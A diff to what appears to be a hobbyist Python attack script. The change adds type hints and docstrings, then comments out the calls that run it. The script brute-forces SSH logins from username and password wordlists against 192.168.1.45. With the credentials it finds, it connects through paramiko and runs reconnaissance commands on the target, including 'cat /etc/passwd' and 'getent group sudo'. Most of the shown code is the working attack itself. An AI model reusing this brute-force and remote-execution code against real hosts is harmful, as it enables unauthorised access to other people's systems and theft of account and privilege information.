@@ -3,7 +3,8 @@ from pathlib import Path
 from subprocess import run, PIPE
 import paramiko
 
-def processList(inp = ""):
+def processList(inp = "")->list:
+    """ Function that process lists txts in lists. """
     with open(inp, "r+") as f:
             tmp = f.readlines()
     lst = []
@@ -12,7 +13,8 @@ def processList(inp = ""):
     return lst
 
 
-def getSshCredsAndConn(ulist="",plist="",domain=""):   
+def getSshCredsAndConn(ulist="",plist="",domain="")->tuple[(str,str)]:
+    """ Slow bruteforce of ssh credentials. """   
     uname = processList(ulist) # "./init/userlist"
     passwd = processList(plist) # "./init/passlist"
     retUsr = "x"
@@ -32,7 +34,9 @@ def getSshCredsAndConn(ulist="",plist="",domain=""):
             break
     return (retUsr,retPass)
 
-def autoSshPawn(usr,password,host,sequence):
+def autoSshPawn(usr,password,host,sequence)-> None:
+    """ Take ssh credentials to connect and remotely runs\\
+        instructions on target machine. """
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
@@ -49,10 +53,10 @@ def autoSshPawn(usr,password,host,sequence):
     exit(0)
 
     
-usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain="192.168.1.45")
-print(f"Credentials user = {usr} | password={pwd}")
-autoSshPawn(usr,pwd,"192.168.1.45",['whoami',
-                                    'pwd',
-                                    'ls -la',
-                                    'cat /etc/passwd',
-                                    'getent group sudo'])
+# usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain="192.168.1.45")
+# print(f"Credentials user = {usr} | password={pwd}")
+# autoSshPawn(usr,pwd,"192.168.1.45",['whoami',
+#                                     'pwd',
+#                                     'ls -la',
+#                                     'cat /etc/passwd',
+#                                     'getent group sudo'])
